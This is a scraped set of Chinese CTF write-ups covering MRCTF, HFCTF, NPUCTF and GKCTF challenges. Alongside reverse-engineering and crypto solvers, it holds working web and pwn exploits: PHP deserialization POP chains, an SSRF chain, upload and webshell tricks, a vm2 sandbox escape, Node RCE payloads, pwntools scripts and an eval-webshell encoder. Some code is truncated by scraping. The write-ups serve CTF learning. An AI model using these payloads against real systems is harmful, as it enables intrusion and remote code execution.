组合。这也许解释了，为什么如果直接在网址上，传递\\0\\0username会报错，因为实际上并不是\\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。 BASE64 Wrapper LFI php://filter/convert.base64-encode/resource=flag.php Exp: var=\"php://filter/convert.base64-encode/resource=flag.php\"; } } $s = new Show(); $t = new Test(); $r = new Modifier(); $t->p = $r; $s->str = $t; $s->source = $s; var_dump(urlencode(serialize($s))); ?> 分析： append($this->var);//7.然后会调用到这里 } } class Show{ public $source; public $str; public function __construct($file='index.php'){ $this->source = $file; echo 'Welcome to '.$this->source.\"\"; } public function __toString(){ return $this->str->source;//4.这里会调用str->source的__get 那么我们将其设置为Test对象 } public function __wakeup(){//2.如果pop是个Show,那么调用这里 if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this->source)) {//3.匹配的时候会调用__toString echo \"hacker\"; $this->source = \"index.php\"; } } } class Test{ public $p; public function __construct(){ $this->p = array(); } public function __get($key){ $function = $this->p;//5.触发到这里 return $function();//6.()会调用__invoke,我们这里选择Modifier对象 } } if(isset($_GET['pop'])){ @unserialize($_GET['pop']);//1.反序列调用这里 } else{ $a=new Show; highlight_file(__FILE__); } 构造即可 套娃 在URL中GET请求当输入.或者`(空格)或者_都会忽略，因此b_u_p_t,其实就是b u p t,正则的意思是必须要23333开头和结尾，但是值不能为23333，这个时候url的%0A为换行污染，可以绕过正则，且值不为23333。直接进入下一个套娃。jsfuck在控制器输出发现POST Merak。Post Merak=1即可查看源码。判断意图是模拟本地用户，这里我禁了XFF头，可以用Client-ip进行绕过即可，最后file_get_contents`需要解密，exp如下 Ezaudit index页面是一个啥也没用的页面，需要扫后台，发现存在login.php为空，考虑到可能是处理后端,前端则是login.html,发现是一个简单的登录框，只有登录框想到大概率存在源码泄露，发现www.zip文件，判断登录逻辑是sql查询，没有任何过滤，可以直接万能密码，还需要输入密钥，这里产生公钥和秘钥的机制都是使用mt_rand，而这是个伪随机数，可以进行破解，知道公钥后将公钥转化成php_mt_seed格式，gayhub直接git clone，得到种子后，再将其生成12位密钥即可，具体原理:https://blog.csdn.net/crisprx/article/details/104306971 exp: 你传你&#x1F40E;呢 很经典的上传绕过，主要考察一下基本的上传绕过技能 利用BurpSuite修改MIME欺骗后端文件类型 修改 Content-Type: image/png 然后就可以传任意文件后缀 利用.htaccess来制作图片马 增加使用php解析的文件后缀(.jpg) AddType application/x-httpd-php .jpg 然后再写个一句话 用蚁剑连上就可以了 Ezpop Revenge 主要考察CMS审计能力和SSRF的应用 顺着Typecho的源码搞的 从Github上克隆源码，发现1.2预览版还有1.1的POP链 改造了一下入口,然后套了SoapClient来SSRF 入口点 //HelloWorld/Plugin.php if (isset($_POST['C0incid3nc3'])) { if(preg_match(\"/file|assert|eval|op|sy|exec|dl|ini|pass|scan|log|[`\\'~^?<>$%]+/i\",base64_decode($_POST['C0incid3nc3'])) === 0) unserialize(base64_decode($_POST['C0incid3nc3'])); else { echo \"Not that easy.\"; } //call_user_func(\"call_user_func\",array($a,\"233\")); } class HelloWorld_DB{ private $flag=\"MRCTF{this_is_a_fake_flag}\"; private $coincidence; function __wakeup(){ $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']); } } 路由点 //Typecho/Plugin.php Helper::addRoute(\"page_admin_action\",\"/page_admin\",\"HelloWorld_Plugin\",'action'); Pop链可以参照Exp: coincidence = $coincidence; } function __wakeup(){ $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']); } } class Typecho_Request{ private $_params; private $_filter; function __construct($params,$filter){ $this->_params=$params; $this->_filter=$filter; } } class Typecho_Feed{ private $_type = 'ATOM 1.0'; private $_charset = 'UTF-8'; private $_lang = 'zh'; private $_items = array(); public function addItem(array $item){ $this->_items[] = $item; } } $target = \"http://127.0.0.1/flag.php\"; $post_string = ''; $headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=m6o9n632iub7u2vdv0pepcrbj2' ); $a = new SoapClient(null,array('location' => $target, 'user_agent'=>\"eki\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\".join(\"\\r\\n\",$headers).\"\\r\\nContent-Length: \".(string)strlen($post_string).\"\\r\\n\\r\\n\".$post_string, 'uri' => \"aaab\")); $payload1 = new Typecho_Request(array('screenName'=>array($a,\"233\")),array('call_user_func')); $payload2 = new Typecho_Feed(); $payload2->addItem(array('author' => $payload1)); $exp1 = array('hello' => $payload2, 'world' => 'typecho'); $exp = new HelloWorld_DB($exp1); echo serialize($exp).\"\\n\"; echo urlencode(base64_encode(serialize($exp))); 可以分析内网地址 这也是为啥cookie要带session 用payload打一次刷新下页面var_dump()就会dumpflag出来了 Not So Web Application 首先是题目说明，这玩意本来没这么恶心（没伪装加上 User 和 SQL 那个 SVG）本题主要难点在于 Web Assembly 至今没有个能用的调试器，所以需要多种手段动调+静态调试。 可以先通过和其他 Qt for Web Assembly 程序比对，去掉一大半疑似函数，同时可以通过搜索字符串（Incorrect等）确定大概相关函数位置。 同时通过给输入框塞入大量垃圾（>64KB，wasm基本内存单位）触发内存越界错误找到变量存储位置。最终在浏览器里动调和 wasm2c 的辅助可以找到flag加密后内容和比对算法。 RE Xor(校内专供) 异或一次后的数据再异或一次即可得到原数据 将输入字符和序号进行异或，再与目标数组比较 所以只需要将目标数组反过来再次异或就可以得到flag #include #include #include char flag[100]={0x4D,0x53,0x41,0x57,0x42,0x7E,0x46,0x58,0x5A,0x3A,0x4A,0x3A,0x60,0x74,0x51,0x4A,0x22,0x4E,0x40,0x20,0x62,0x70,0x64,0x64,0x7D,0x38,0x67}; int main() { for(int i=0;i 得到flag:MRCTF{@_R3@1ly_E2_R3verse!} Transform 其实就是个简单的字符置换，可以试试输入有规律的字符串，然后dump出处理过后的字符串 这样就知道置换矩阵了，拿出数据置换一下，异或一下就是flag。。 撸啊撸 这道题目其实题目名有很大的提示，lua lu 这个使用C++内嵌lua写的，不然为什么会显示\"I need My friend to help me check your flag!\" 只需要根据判断逻辑逆向思考，可以看出sub_7FF650AFD980是个很重要的函数 然后观察它的参数，发现出入了一个乱七八糟的字符串。 看不出来是啥，但是如果动调，就会发现这个字符串被修改了，看的懂了 cmps={83,80,73,80,76,125,61,96,107,85,62,63,121,122,101,33,123,82,101,114,54,100,101,97,85,111,39,97} print(\"Give Me Your Flag LOL!:\") flag=io.read() if string.len(flag)~=29 then print(\"Wrong flag!\") os.exit() end for i=1,string.len(flag) do local x=string.byte(flag,i) if i%2==0 then x=x~i else x=x+6 end if x~=cmps[i] then print(\"Wrong flag!\") os.exit() end end print(\"Right flag!\") os.exit() 这里的~是异或的意思，就很容易看懂了 EXP a=[83,80,73,80,76,125,61,96,107,85,62,63,121,122,101,33,123,82,101,114,54,100,101,97,85,111,39,97] flag=\"\" for i in range(1,29): x=a[i-1] if i%2==0: x^=i else: x-=6 flag+=chr(x) print flag PixelShooter 这道题目使用了Unity写的个小游戏 表面上是apk，其实是个C#逆向 大部分的Unity都是用C#写的，其中有个存储逻辑代码的C#二进制文件 Assembly-Csharp.dll 所以只要找到这个玩意就是了 apk解包，PixelShooter.apk\\assets\\bin\\Data\\Managed下面就是了 dnspy打开 即可在UIController下找到flag MRCTF{Unity_1S_Fun_233} Junk 这道题如同其名字，Junk 往里面塞了很多JunkCode，只要一个个去掉就是了，U和C键交替(里面插了许多0xE8字节来迷惑IDA) 顺便把一些稀里糊涂的Call给删了(通过Call一个函数，函数里修改了EIP的值，进行跳转，这会导致F5分析失败) 可以仔细分析一下，这里对输入进行了异或 然后实现了循环左移和右移的操作，鉴于位移四位，其实左移右移都是一样的 这里还有个奇怪的函数sub_B81090，对数据进行了奇怪的操作 点开看看 char __fastcall sub_B81090(char *a1, int a2) { int v2; // eax signed int v3; // esi int v4; // edi char v5; // al unsigned __int8 v6; // ah unsigned __int8 v7; // dh unsigned __int8 v8; // bh unsigned __int8 v9; // dl signed int v10; // eax bool v11; // cf unsigned __int8 v12; // cl int i; // ecx int v15; // [esp+8h] [ebp-14h] char v16; // [esp+10h] [ebp-Ch] char v17; // [esp+11h] [ebp-Bh] char v18; // [esp+12h] [ebp-Ah] char v19; // [esp+13h] [ebp-9h] unsigned __int8 v20; // [esp+14h] [ebp-8h] unsigned __int8 v21; // [esp+15h] [ebp-7h] unsigned __int8 v22; // [esp+16h] [ebp-6h] unsigned __int8 v23; // [esp+1Bh] [ebp-1h] v2 = a2; v3 = 0; v4 = 0; if ( a2 ) { do { v15 = v2 - 1; v5 = *a1++; *(&v20 + v3++) = v5; v6 = v22; v7 = v21; v8 = v20; v23 = v22; if ( v3 == 3 ) { v9 = (v22 >> 6) + 4 * (v21 & 0xF); v17 = (v21 >> 4) + 16 * (v20 & 3); v18 = (v22 >> 6) + 4 * (v21 & 0xF); v19 = v22 & 0x3F; v16 = v20 >> 2; byte_BA1708[v4] = byte_B9EA00[v20 >> 2]; byte_BA1709[v4] = byte_B9EA00[(unsigned __int8)((v7 >> 4) + 16 * (v8 & 3))]; byte_BA170A[v4] = byte_B9EA00[v9]; byte_BA170B[v4] = byte_B9EA00[v6 & 0x3F]; v4 += 4; v3 = 0; } v2 = v15; } while ( v15 ); if ( v3 ) { v10 = v3; if ( v3 >= 3 ) { v12 = v23; } else { v11 = (unsigned int)v3 > 2; v17 = (v7 >> 4) + 16 * (v8 & 3); LOBYTE(v2) = v12 >> 6; v19 = v12 & 0x3F; v18 = (v12 >> 6) + 4 * (v7 & 0xF); for ( i = 0; i 不难发现就是个base64变种，不过就是把表换了一下，等于号换成点而已 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)!@#$%^&*(+/ 最后在和已有字符串比较 所以思路很简单: 解变种base64->循环左移4位->异或3->得到flag EXP import base64 orig=\"%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(aGBsZ@ZpZn!oYGxnZm%w..\" orig=orig.replace(')','0') orig=orig.replace('!','1') orig=orig.replace('@','2') orig=orig.replace('#','3') orig=orig.replace('$','4') orig=orig.replace('%','5') orig=orig.replace('^','6') orig=orig.replace('&','7') orig=orig.replace('*','8') orig=orig.replace('(','9') orig=orig.replace('.','=') print orig code=base64.b64decode(orig).encode('hex') flag=\"\" for x in range(0,len(code),2): num=int(code[x:x+2],16) num=(((num>>4)&0xff) | ((num MRCTF{junkjunkjunkcodejunkjunkcodejunkcode} EasyCPP 程序运用了较多的C++特性 所以代码看起来会比较冗杂，好在给了符号 总体上是要输入9个数字，并存入了Vector 然后通过lambda表达式进行了每个数字异或1的操作，然后对结果调用了个depart的函数 得到一个string的结果，最后和原有的9个奇怪字符串比较 最后输出九个数字拼起来的字符串，flag就是要把这九个数字拼起来进行md5校验后包起来 然后来分析下depart函数和那个负责替换的lambda表达式 __int64 __fastcall depart(int a1, __int64 a2, double a3) { char v4; // [rsp+20h] [rbp-60h] char v5; // [rsp+40h] [rbp-40h] int i; // [rsp+68h] [rbp-18h] int v7; // [rsp+6Ch] [rbp-14h] v7 = a1; for ( i = 2; ; ++i ) { std::sqrt((unsigned int)a1); //枚举到根号n if ( a3 ,std::allocator>(&v4, &unk_500C, &v5); std::__cxx11::basic_string,std::allocator>::operator+=(a2, &v4); std::__cxx11::basic_string,std::allocator>::~basic_string(&v4); return std::__cxx11::basic_string,std::allocator>::~basic_string(&v5); } 最后那个比较函数其实就是 replace(a.begin(),a.end(),'0','O'); replace(a.begin(),a.end(),'1','l'); replace(a.begin(),a.end(),'2','z'); replace(a.begin(),a.end(),'3','E'); replace(a.begin(),a.end(),'4','A'); replace(a.begin(),a.end(),'5','s'); replace(a.begin(),a.end(),'6','G'); replace(a.begin(),a.end(),'7','T'); replace(a.begin(),a.end(),'8','B'); replace(a.begin(),a.end(),'9','q'); replace(a.begin(),a.end(),' ','='); 将这些东西替换回数字，再把这些数字乘起来，再异或1一下就是输入的九个数字 2345 1222 5774 2476 3374 9032 2456 3531 6720 MRCTF{4367FB5F42C6E46B2AF79BF409FB84D3} Shit 这道题目是临时出的，其实只要过掉开局的一个死循环，也可以attach，然后dump出密钥 就可以直接进行解密了，解密算法其实就是加密算法的逆向过程，全是位运算 //key就是密钥 请直接dump unsigned int ks[6]={0x8c2c133a,0xf74cb3f6,0xfedfa6f2,0xab293e3b,0x26cf8a2a,0x88a1f279}; void decode() { unsigned int k=0,bk=0; for(int i=5;i>=0;i--) if(i>0) ks[i]^=ks[i-1]; for(int i=0;i>16)) | ((~(k>(32-key[i/4])); printf(\"%X\\n\",k); } } 解密出六个int，直接转ascii就是flag Virtual Tree 这道题静态分析完全就是错的，因为我在main函数运行前会将一些函数给替换掉 所以静态分析完全失败的，但是似乎大部分人都是动调2333 int replace() //开局替换函数代码， { void *addr=doit; int val=(int)addr; DWORD old; if(VirtualProtect(addr,512,PAGE_EXECUTE_READWRITE,&old)==NULL) exit(0); int count=0; while(*((PBYTE)val)!=0x90) { if(*((PDWORD)val)==0x00401510) *((PDWORD)val)=(DWORD)list[count++]; //将一个全是同一个call的函数替换成不一样的函数 val=val+1; } addr=main; val=(int)addr; if(VirtualProtect(addr,512,PAGE_EXECUTE_READWRITE,&old)==NULL) exit(0); while(*((PBYTE)val)!=0x90) { if(*((PDWORD)val)==(DWORD)walkB) { *((PDWORD)val)=(DWORD)walkA; //加密代码的替换 break; } val=val+1; } } 所以，需要动调来看代码，代码才是对的。。 int sub_12F16F0() //具体操作就是这些加减 异或 { Add(0, 10); Xor(1, 2); Add(2, 7); Sub_abs(3, 7); Xor(4, 5); Sub_abs(6, 1); Add(7, 3); Xor(8, 7); Sub_abs(9, 8); Sub_abs(10, 7); Xor(11, 12); Sub_abs(12, 2); Xor(14, 15); return Add(15, 2); } 还有一个函数对输入进行了异或，dump出来就是了。。 所以只需要将数据按照sub_12F16F0()解方程之后，在异或dump出来的数据就可以得到flag了 @_7r3e_f0r_fuNN! Crypto keyboard 其实就是手机键盘 每行代表当个数字键盘上的字母摁一次就是第一个 以此类推。 天干地支+甲子 查找到天干地支图，发现每个都对应着数字，然后甲子是60，把每个都加上 60后用ascii码转下就可以了 babyRSA 这题本身除了RSA考点外，还考察了模平方算法，那个Q如果硬怼是怼不出来的，必须模平方，至于模平方算法代码网上蛮多，我这就不贴了 easy_RSA 比较典型的RSA套娃，分别求出p,q，利用题干中的一些函数即可求解， p：已知$\\phi(n)=(p-1)(q-1)$, $n=pq$，利用z3的solve容易求解 q：已知$ed, n=pq$，可知$ed=k(p-1)(q-1)+1$， 又由于$\\frac{ed-1}{n} \\leq k \\leq \\frac{ed-1}{2n}$ 利用这个区间，循环solve即可，exp如下： import sympy from gmpy2 import invert from Crypto.Util.number import getPrime, long_to_bytes from z3 import * base = 65537 def gen_prime(N): while 1: A = getPrime(N) if A % 4 == 3: break return A def GET_P(n, F_n): p = Int('p') q = Int('q') expr = And(F_n == (p - 1) * (q - 1), n == p * q, p > 0, q > 0) solver = Solver() solver.add(expr) if solver.check() == sat: print(solver.model()) print(solver.model().eval(p)) print(print(solver.model().eval(q))) res_p = solver.model().eval(q).as_long() res_q = solver.model().eval(p).as_long() seed2 = 2021 * res_p + 2020 * res_q if seed2 0, q > 0) solver = Solver() solver.add(expr) if solver.check() == sat: print(solver.model()) print(solver.model().eval(p)) print(print(solver.model().eval(q))) res_p = solver.model().eval(q).as_long() res_q = solver.model().eval(p).as_long() break seed2 = 2021 * res_p - 2020 * res_q if seed2 real_random 利用了线性同余来构造伪随机，观察发现b,c,m满足最大周期条件，故知每次以flag[t]为种子生成的随机数列的周期均为m，通过泄露的(p-1)*(q-1)可以算出m，然后减去$2^d$（记得取模）即可求解 古典密码知多少 猪圈密码，圣堂武士密码，标准银河字母，且已提示都为大写字母 解密可得 FGCPFLIRTUASYON , 图片里也提示fence ，故尝试栅栏密码 每组字数为3时即可解得flag：MRCTF{CRYPTOFUN} PWN nothing_but_everything 本身是简单的ROP，但是我静态编译了一下后，去了符号，所以如果想看的比较轻松，需要去找找Ubuntu下的sig文件然后ida里导入，就可以复现不少函数的样子了，或者可以结合动调，总之看懂题就很简单了，直接ROPgadget一把梭。 easy_equation （下面说的都没用，这题忘关溢出了，直接溢出就行 很明显的格式化字符漏洞，但是在利用上需要一些技巧，首先是看到那个公式，用z3的solve很好算出来解是2，之后思路就很明确，将judge的值覆写成2即可，如果直接想要直接用fmstr_payload这种payload自动生成,会惊喜的发现，无法靠填充字符达到地址对齐，所以需要转换一下思路，考虑到地址的小端序存储， 如果在judge_addr-1的位置存入0x200，那么judge_addr的值自然会变成0x02，于是exp（不是唯一解法，也可以正向构造）如下： from pwn import * p = process('easy_equation') judge_addr = 0x60105C payload = 'a' * 6 + '%' + str(0x200 - 6) + 'c%10$hn' payload += p64(judge_addr - 1) p.sendline(payload) p.interactive() spfa 有一个明显的get_flag函数，发现执行该函数的条件是flag!=-1，但是程序开头已经将flag赋值为-1，并且程序内并没有涉及flag的运算，于是考虑通过溢出修改flag。 查看一下bss段可以发现，flag变量在qu数组下方，相当于qu[1000]，在SPFA函数里理论可以访问并修改qu[1000]，于是需要构建特殊的图来使队列（qu数组）越界。 仔细分析可以知道，SPFA算法存在一处判断错误(if(d[y] >= d[x] + len[node]))，这使得如果路径中出现0环会发生死循环，节点不断入队，最后使队列溢出。 所以，我们所做的，只需要构造一个0环，然后求最短路。 exp： from pwn import * p = process(\"./spfa\") def add(a, b, c): p.sendlineafter(\":\\n\", str(1)) p.sendlineafter(\":\\n\", str(a) + \" \" + str(b) + \" \" + str(c)) def query(a, b): p.sendlineafter(\":\\n\", str(2)) p.sendlineafter(\":\\n\", str(a) + \" \" + str(b)) def get_flag(): p.sendlineafter(\":\\n\", str(3)) add(1, 2, 0) add(2, 1, 0) query(1, 2) get_flag() p.interactive() Shellcode 主要想考察Googlehack能力 没啥好说的 直接去 http://shell-storm.org/shellcode/ 扒个x64 shellcode下来就可以了 Shellcode Revenge 主要想考察Googlehack能力 ida可以分析出提交的Shellcode要满足全为大小写和数字的限制 可以参考这篇文章 https://hama.hatenadiary.jp/entry/2017/04/04/190129 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"contest/hfctf-2020.html":{"url":"contest/hfctf-2020.html","title":"2020数字中国创新大赛虎符网络安全赛","keywords":"","body":"虎符Web1Web2Web3Misc1参考链接虎符 Web1 利用点: jsonwebtoken库缺陷 当用户传入jwt secret为空时jsonwebtoken会采用algorithm none进行解密 /package.json 显示使用了koa koa.session中有用户名信息，存在签名验证 app.js中有注释 /** * 或许该用 koa-static 来处理静态文件 * 路径该怎么配置？不管了先填个根目录XD */ function login() { const username = $(\"#username\").val(); const password = $(\"#password\").val(); const token = sessionStorage.getItem(\"token\"); $.post(\"/api/login\", {username, password, authorization:token}) .done(function(data) { const {status} = data; if(status) { document.location = \"/home\"; } }) .fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); }); } function register() { const username = $(\"#username\").val(); const password = $(\"#password\").val(); $.post(\"/api/register\", {username, password}) .done(function(data) { const { token } = data; sessionStorage.setItem('token', token); document.location = \"/login\"; }) .fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); }); } function logout() { $.get('/api/logout').done(function(data) { const {status} = data; if(status) { document.location = '/login'; } }); } function getflag() { $.get('/api/flag').done(function(data) { const {flag} = data; $(\"#username\").val(flag); }).fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); }); } 注释提示了/controllers/api.js源码泄露 const crypto = require('crypto'); const fs = require('fs') const jwt = require('jsonwebtoken') const APIError = require('../rest').APIError; module.exports = { 'POST /api/register': async (ctx, next) => { const {username, password} = ctx.request.body; if(!username || username === 'admin'){ throw new APIError('register error', 'wrong username'); } if(global.secrets.length > 100000) { global.secrets = []; } const secret = crypto.randomBytes(18).toString('hex'); const secretid = global.secrets.length; global.secrets.push(secret) const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});//应该是algorithms ctx.rest({ token: token }); await next(); }, 'POST /api/login': async (ctx, next) => { const {username, password} = ctx.request.body; if(!username || !password) { throw new APIError('login error', 'username or password is necessary'); } const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid = 0)) { throw new APIError('login error', 'no such secret id'); } const secret = global.secrets[sid];//令sid为不存在值使得secret=none const user = jwt.verify(token, secret, {algorithm: 'HS256'});//如果token中的加密方法为空那么{algorithm: 'HS256'}不生效 const status = username === user.username && password === user.password; if(status) { ctx.session.username = username; } ctx.rest({ status }); await next(); }, 'GET /api/flag': async (ctx, next) => { if(ctx.session.username !== 'admin'){ throw new APIError('permission error', 'permission denied'); } const flag = fs.readFileSync('/flag').toString(); ctx.rest({ flag }); await next(); }, 'GET /api/logout': async (ctx, next) => { ctx.session.username = null; ctx.rest({ status: true }) await next(); } }; Web2 nodejs的rce fuzz方法 Object.getOwnPropertyNames(this) 得到依赖包名 Error().stack 抛出栈错误 这里是vm2的一个逃逸payload，然而当时并不知道urlencode和数组可以绕过。。。。 随便到github上找个payload http://14e25396-8547-4c6c-8a05-b28adf35624b.node3.buuoj.cn/run.php?code[]=try%20{%20require(%27child_process%27).execSync(%22idea%22)%20}%20catch(e){}let%20buffer%20=%20{hexSlice:%20()%20=%3E%20%22%22,magic:%20{get%20[Symbol.for(%22nodejs.util.inspect.custom%22)](){throw%20f%20=%3E%20f.constructor(%22return%20process%22)();}}};try{Buffer.prototype.inspect.call(buffer,%200,%20{%20customInspect:%20true%20});}catch(e){e(()=%3E0).mainModule.require(%27child_process%27).execSync(%22cat%20/flag%22)} Web3 直接给了源码 getMessage(); } } elseif ($direction === \"download\") { try{ $filename = basename(filter_input(INPUT_POST, 'filename')); $file_path = $dir_path.\"/\".$filename; if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){ throw new RuntimeException('invalid file path'); } if(!file_exists($file_path)) { throw new RuntimeException('file not exist'); } header('Content-Type: application/force-download'); header('Content-Length: '.filesize($file_path)); header('Content-Disposition: attachment; filename=\"'.substr($filename, 0, -65).'\"'); if(readfile($file_path)){ $download_result = \"downloaded\"; }else{ throw new RuntimeException('error while saving'); } } catch (RuntimeException $e) { $download_result = $e->getMessage(); } exit; } ?> 拿到session内容 \busernames:5:\"guest\"; 然后就可以根据格式伪造session了 可以判断这里采用的php序列化器是php_binary 生成一个 然后得到这个session的文件名 php -r \"echo hash_file('sha256', 'sess');\" sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4 使用这个session然后创建一个/success.txt/目录就行 file_exists ( string $filename ) : bool 检查文件或目录是否存在。 PS:Postman真好用 Misc1 用取证大师可以看到邮件来往记录，然后根据浏览器记录可以看出前部分使用了codemoji,最后提示了realname，比赛的时候一直没找到，最后发现在手机数据的通讯录里 然后phpstudy的博客，和其他邮件的emojiaes key都可以解了 参考链接 https://www.zhaoj.in/read-6512.html © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"contest/npuctf-2020.html":{"url":"contest/npuctf-2020.html","title":"NPUCTF 2020","keywords":"","body":"NPUCTFReadlezPHPEzinclude (赛后复现)验证&#x1F40E; (赛后复现)参考资料NPUCTF ReadlezPHP Ezinclude (赛后复现) 刚开始貌似是个逻辑漏洞 随便填个东西，在Request里就可以看到hash，然后用那个当passwd即可 第二步include 利用点 php7 segment fault 导致文件被保存在/tmp/phpXXXXXX下 爆破半天，发现有dir.php可以看/tmp目录下文件。。。。 网上找到一个脚本魔改了一下 #!/usr/bin/env python # -*- coding: utf-8 -*- import requests import string import itertools import time charset = string.digits + string.letters base_url = \"http://6a1c86d0-5362-4d88-b33e-7514e488b64c.node3.buuoj.cn\" def upload_file_to_include(url, file_content): files = {'file': ('evil.jpg', file_content, 'image/jpeg')} try: #print url response = requests.post(url, files=files,allow_redirects=False) #print response.text except Exception as e: print e def generate_tmp_files(): webshell_content = \"\".encode( \"base64\").strip().encode(\"base64\").strip().encode(\"base64\").strip() #file_content = '' % ( # webshell_content) file_content = \"\\\"); echo eki;?>\"# 为啥这样写是因为一开始蚁剑始终连不上.... phpinfo_url = \"%s/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\" % ( base_url) length = 6 times = len(charset) ** (length / 2) for i in xrange(times): print \"[+] %d / %d\" % (i, times) upload_file_to_include(phpinfo_url, file_content) time.sleep(0.5) def main(): generate_tmp_files() if __name__ == \"__main__\": main() 然后GET /flflflflag.php?file=/tmp/phpXXXXXX 看到返回eki,shelleki.php就生成了 验证&#x1F40E; (赛后复现) 弱类型比较+原型链污染 可以拿到源码 const express = require('express'); const bodyParser = require('body-parser'); const cookieSession = require('cookie-session'); const fs = require('fs'); const crypto = require('crypto'); const keys = require('./key.js').keys; function md5(s) { return crypto.createHash('md5') .update(s) .digest('hex'); } function saferEval(str) { if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&|^%<>=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '')) { return null; } return eval(str); } // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个 const template = fs.readFileSync('./index.html').toString(); function render(results) { return template.replace('{{results}}', results.join('')); } const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(bodyParser.json()); app.use(cookieSession({ name: 'PHPSESSION', // 2020.3/WORKER2 嘿嘿，给&#x1F474;爪⑧ keys })); Object.freeze(Object); Object.freeze(Math); app.post('/', function (req, res) { let result = ''; const results = req.session.results || []; const { e, first, second } = req.body; if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])) { if (req.body.e) { try { result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!'; } catch (e) { console.log(e); result = 'Wrong Wrong Wrong!!!'; } results.unshift(`${req.body.e}=${result}`); } } else { results.unshift('Not verified!'); } if (results.length > 13) { results.pop(); } req.session.results = results; res.send(render(req.session.results)); }); // 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI app.get('/source', function (req, res) { res.set('Content-Type', 'text/javascript;charset=utf-8'); res.send(fs.readFileSync('./index.js')); }); app.get('/', function (req, res) { res.set('Content-Type', 'text/html;charset=utf-8'); req.session.admin = req.session.admin || 0; res.send(render(req.session.results = req.session.results || [])) }); app.listen(80, '0.0.0.0', () => { console.log('Start listening') }); if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])) 本来想着md5前缀碰撞的但是没构造出了，然后就是方向错了..... 这里绕过利用js 任意数据+字符串会转换成字符串的特性 然后用[1]和1就行了 传数组的话，用json来传输 然后就是绕过这个SafeEval function saferEval(str) { if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&|^%<>=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '')) { return null; } return eval(str); } 可以用regex101去试 可以发现只能用Math函数 那么就用他来原型链污染了 Math.constructor ƒ Object() { [native code] } b = Math+1 \"[object Math]1\" b.constructor ƒ String() { [native code] } Math.constructor.constructor ƒ Function() { [native code] } Math+1把Math.constructor变成String 可以用这个脚本生成CharCode #coding=utf-8 payload = \"return process.mainModule.require('child_process').execSync('cat /flag')\" print \"(\"+\",\".join([str(ord(i)) for i in payload])+\")\" Exp (Math=>( Math=Math.constructor, Math.x=Math.constructor( Math.fromCharCode( 114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41) )()))(Math+1) 参考资料 https://www.plasf.cn/2020/04/25/Node%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83-1/ © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"contest/gkctf-2020.html":{"url":"contest/gkctf-2020.html","title":"GKCTF 2020","keywords":"","body":"GKCTF 2020前言0x01 Checkin0x02 CVE Checkin0x03 老八小超市儿0x04 EZ三剑客-EzNode0x05 EzWeb0x06 EzTypechoGKCTF 2020 前言 比赛当天有事，然后就没咋打，但是赛后复现发现题目出的好棒 0x01 Checkin 直接给了eval后门，但是得用base64编码， 于是手写个蚁剑编码器 /** * php::base64编码器 * Create at: 2020/05/24 10:13:32 */ 'use strict'; /* * @param {String} pwd 连接密码 * @param {Array} data 编码器处理前的 payload 数组 * @return {Array} data 编码器处理后的 payload 数组 */ module.exports = (pwd, data, ext={}) => { // ########## 请在下方编写你自己的代码 ################### // 以下代码为 PHP Base64 样例 // 生成一个随机变量名 let randomID = `_0x${Math.random().toString(16).substr(2)}`; // 原有的 payload 在 data['_']中 // 取出来之后，转为 base64 编码并放入 randomID key 下 data[randomID] = Buffer.from(data['_']).toString('base64'); // shell 在接收到 payload 后，先处理 pwd 参数下的内容， data[pwd] = new Buffer(`eval(base64_decode($_POST[${randomID}]));die();`).toString('base64'); // ########## 请在上方编写你自己的代码 ################### // 删除 _ 原有的payload delete data['_']; // 返回编码器处理后的 payload 数组 return data; } 然后就能连上了，但是/var/html目录下没法写其他文件 而且得绕disabled_functions 于是乎用蚁剑执行脚本的插件 传一个hack.so 就能绕过了 0x02 CVE Checkin 后来放了提示是cve-2020-7066 但其实应该fuzz到吧.... 然后就是做题的时候特意开了个靶机去监听 后来发现访问127.0.0.1直接有提示 傻了傻了.... 0x03 老八小超市儿 渗透题 没去想后台地址弱密码还是经验太少了or2 然后就是看传文件点，传个shell上去 